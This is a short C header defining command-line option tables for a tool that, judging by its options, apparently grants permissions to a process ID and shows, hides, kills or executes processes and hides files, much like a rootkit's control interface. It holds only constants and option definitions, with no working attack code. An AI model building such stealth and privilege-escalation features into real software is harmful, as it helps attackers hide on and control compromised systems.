#ifndef COMMANDS_H
#define COMMANDS_H

#include "ketopt.h"

#define OPT_PRIV_PID 101
#define OPT_PRIV_PERM 102

#define OPT_PROC_SHOW 201
#define OPT_PROC_HIDE 202
#define OPT_PROC_KILL 203
#define OPT_PROC_EXEC 204

#define OPT_FILE_SHOW 301
#define OPT_FILE_HIDE 302

const static ko_longopt_t priv_longopts[] = {
	{ "pid", ko_required_argument, OPT_PRIV_PID },
	{ "perm", ko_required_argument, OPT_PRIV_PERM },
	{ NULL, 0, 0 },
};

const static ko_longopt_t proc_longopts[] = {
	{ "show", ko_required_argument, OPT_PROC_SHOW },
	{ "hide", ko_required_argument, OPT_PROC_HIDE },
	{ "kill", ko_required_argument, OPT_PROC_KILL },
	{ "exec", ko_required_argument, OPT_PROC_EXEC },
	{ NULL, 0, 0 },
};

const static ko_longopt_t file_longopts[] = {
	{ "show", ko_required_argument, OPT_FILE_SHOW },
	{ "hide", ko_required_argument, OPT_FILE_HIDE },
	{ NULL, 0, 0 },
};

int commands_dispatch(int argc, char **argv);

#endif /* COMMANDS_H */
